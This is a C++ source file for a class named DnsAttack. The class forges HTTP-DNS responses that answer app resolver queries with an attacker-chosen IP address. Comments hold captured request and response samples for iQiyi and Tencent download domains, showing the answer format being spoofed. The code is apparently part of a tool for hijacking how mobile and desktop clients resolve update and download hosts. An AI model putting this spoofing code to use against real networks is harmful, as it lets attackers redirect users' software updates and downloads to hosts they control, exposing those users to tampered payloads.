#include "dnsAttack.h"
#include "../HttpUtils.h"

DnsAttack::DnsAttack(unsigned long ulIP, string filepath, string filename) {
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"%s;%s";

	string ip = HttpUtils::getIPstr(ulIP);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat, ip.c_str(), ip.c_str());

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return;
}

/*
GET /d?dn=p2pupdate.inter.iqiyi.com&ttl=1&business=hcdnclient HTTP/1.1
Host: 112.13.64.23
Accept: *//*
Business: hcdnclient
User-Agent: QTP;QTP/1.0.32.1

HTTP/1.1 200 OK
Server: 2.1.0-1.el7.centos
Date: Sat, 21 Mar 2020 20:19:59 GMT
Content-Type: text/html
Connection: keep-alive
Content-Length: 48
Query-Result: 111.48.119.174;111.48.119.175;111.48.119.173,600
Client-IP: 223.96.82.224
Server-Time: 1584821999

111.48.119.174;111.48.119.175;111.48.119.173,600
*/

/*
GET /d?dn=dldir1.qq.com&ttl=1 HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; vivo Y55A Build/MMB29M)
Host: 119.29.29.29
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Connection: close
Server: Http Server
Content-Type: text/html
Content-Length: 204

122.228.0.183;122.228.0.180;122.228.0.178;122.228.0.186;122.228.0.184;115.231.37.157;122.228.0.187;122.228.0.182;
115.231.37.162;122.228.0.185;115.231.191.158;122.228.0.179;122.228.0.175;115.231.37.160,132
*/